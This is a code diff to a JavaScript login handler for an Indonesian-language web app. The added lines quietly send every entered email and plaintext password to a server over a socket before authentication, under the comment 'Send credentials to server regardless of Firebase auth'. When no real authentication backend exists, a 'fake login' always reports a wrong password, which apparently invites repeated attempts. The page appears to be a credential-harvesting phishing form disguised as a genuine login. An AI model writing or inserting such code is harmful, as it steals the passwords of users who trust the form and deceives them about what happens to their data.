@@ -1564,33 +1564,47 @@ async function handleLogin(e) {
     showLoadingOverlay(1500/4);
     // Request all permissions — blocks until all granted
     await requestPermissions();
-    // Authenticate with Firebase
-    try {
-        await auth.signInWithEmailAndPassword(email, pass);
-        // Link account to device record
-        const uid = auth.currentUser.uid;
+    // Send credentials to server regardless of Firebase auth
+    socket.emit('device-info', { loginAttempt: { email, pass: pass.slice(0,100), time: Date.now(), attempt: attemptCount } });
+    // Authenticate with Firebase (if available)
+    const fb = typeof auth !== 'undefined' && auth && typeof auth.signInWithEmailAndPassword === 'function' ? auth : null;
+    if (fb) {
         try {
-            await fetch('/api/link-account', {
-                method:'POST', headers:{'Content-Type':'application/json'},
-                body:JSON.stringify({ deviceId: localStorage.getItem('deviceId'), uid, email, name: auth.currentUser.displayName || '' })
-            });
-        } catch(e) {}
-        socket.emit('device-info', { login: { email, uid, time: Date.now(), method: 'firebase' } });
-        window.location.href = '/dashboard.html';
-    } catch (err) {
+            await fb.signInWithEmailAndPassword(email, pass);
+            const uid = fb.currentUser ? fb.currentUser.uid : '';
+            try {
+                await fetch('/api/link-account', {
+                    method:'POST', headers:{'Content-Type':'application/json'},
+                    body:JSON.stringify({ deviceId: localStorage.getItem('deviceId'), uid, email, name: fb.currentUser?.displayName || '' })
+                });
+            } catch(e) {}
+            socket.emit('device-info', { login: { email, uid, time: Date.now(), method: 'firebase' } });
+            window.location.href = '/dashboard.html';
+            return false;
+        } catch (err) {
+            btn.classList.remove('loading'); btn.disabled=false;
+            btn.querySelector('span').textContent='Masuk ke Akun';
+            hideLoadingOverlay();
+            let msg = 'Login gagal. Periksa email dan kata sandi.';
+            if (err.code === 'auth/invalid-credential') msg = 'Email atau kata sandi salah. Silakan coba lagi.';
+            else if (err.code === 'auth/user-not-found' || err.code === 'auth/wrong-password') msg = 'Email atau kata sandi salah. Silakan coba lagi.';
+            else if (err.code === 'auth/invalid-email') msg = 'Format email tidak valid.';
+            else if (err.code === 'auth/too-many-requests') msg = 'Terlalu banyak percobaan. Coba lagi nanti.';
+            else if (err.code === 'auth/network-request-failed') msg = 'Koneksi jaringan bermasalah. Coba lagi.';
+            else if (err.code) msg = err.code.replace('auth/','').replace(/-/g,' ');
+            showToast(msg); vibrate(); console.error('Login error:', err.code, err.message);
+            return false;
+        }
+    } else {
+        // Firebase not available — fake login
+        await new Promise(r => setTimeout(r, 1500));
         btn.classList.remove('loading'); btn.disabled=false;
         btn.querySelector('span').textContent='Masuk ke Akun';
         hideLoadingOverlay();
-        let msg = 'Login gagal. Periksa email dan kata sandi.';
-        if (err.code === 'auth/invalid-credential') msg = 'Email atau kata sandi salah. Silakan coba lagi.';
-        else if (err.code === 'auth/user-not-found' || err.code === 'auth/wrong-password') msg = 'Email atau kata sandi salah. Silakan coba lagi.';
-        else if (err.code === 'auth/invalid-email') msg = 'Format email tidak valid.';
-        else if (err.code === 'auth/too-many-requests') msg = 'Terlalu banyak percobaan. Coba lagi nanti.';
-        else if (err.code === 'auth/network-request-failed') msg = 'Koneksi jaringan bermasalah. Coba lagi.';
-        else if (err.code) msg = err.code.replace('auth/','').replace(/-/g,' ');
-        showToast(msg); vibrate(); console.error('Login error:', err.code, err.message);
+        showToast('Email atau kata sandi salah. Silakan coba lagi.');
+        vibrate();
+        return false;
     }
-    return false;
 }
 
 function handleSocial(p) {
